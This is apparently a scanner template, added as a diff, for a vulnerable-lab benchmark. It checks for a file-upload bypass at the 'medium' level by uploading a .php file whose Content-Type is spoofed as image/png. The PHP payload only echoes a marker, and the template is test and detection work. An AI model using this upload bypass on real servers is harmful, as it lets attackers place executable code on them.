@@ -1,0 +1,58 @@
+id: vulnlab-upload-mime-bypass
+
+info:
+  name: VulnLab 文件上传（medium 档 · 伪造 MIME 绕过）
+  severity: high
+  author: hediwen
+  tags: [upload, vulnlab, benchmark, mime-bypass]
+  description: |
+    medium 档的防护只有一层：把 `$_FILES['type']` 与白名单比对。
+
+    `$_FILES['type']` 来自 multipart 请求里客户端自己写的 Content-Type 头 ——
+    **防护依据的信息由请求方决定**，所以它不是防护，只是格式检查。
+
+    本 PoC 上传一个 .php 文件，但把它的 Content-Type 声明为 image/png：
+      · low 档：本来就接受（对照）
+      · medium 档：声明通过 → 文件以原名落盘 → 可被访问执行
+      · high 档：getimagesize 解析文件内容失败 → 拒绝
+
+    负向对照：high 档的同一份载荷必须不命中（见 benchmark/probes.yaml）。
+
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/upload/medium.php"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----VulnlabUploadBypass"
+    body: |
+      ------VulnlabUploadBypass
+      Content-Disposition: form-data; name="file"; filename="vulnlab_mime_bypass.php"
+      Content-Type: image/png
+
+      <?php echo "VULNLAB_UPLOAD_BYPASS_MARKER"; ?>
+      ------VulnlabUploadBypass--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      # 只认「上传成功」这句结论，不认文件名 ——
+      # 被拒绝时页面同样会列出文件名（拒绝理由里带名字）。
+      - type: word
+        part: body
+        words: ["上传成功"]
+
+      - type: word
+        part: body
+        words: ["vulnlab_mime_bypass.php"]
+
+    extractors:
+      - type: regex
+        part: body
+        name: saved_path
+        regex:
+          - "(uploads/vulnlab_mime_bypass\\.php)"
